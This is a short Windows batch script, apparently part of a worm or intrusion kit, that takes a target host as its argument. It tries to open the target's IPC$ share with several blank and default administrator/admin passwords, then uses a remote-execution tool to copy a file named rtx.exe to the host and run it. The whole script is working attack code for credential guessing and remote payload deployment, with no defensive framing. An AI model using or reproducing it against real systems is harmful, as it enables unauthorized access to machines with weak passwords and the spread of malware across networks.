@echo off
net use /del \\%1\ipc$
net use \\%1\ipc$ "" /user:administrator
net use \\%1\ipc$ "administrator" /user:administrator
net use \\%1\ipc$ "administrator" /user:admin
net use \\%1\ipc$ "" /user:admin
net use \\%1\ipc$ "admin" /user:administrator
net use \\%1\ipc$ "admin" /user:admin
x \\%1 attrib.exe -r rtx.exe
x \\%1 -f -c -d rtx.exe -o
x \\%1 -d rtx.exe -o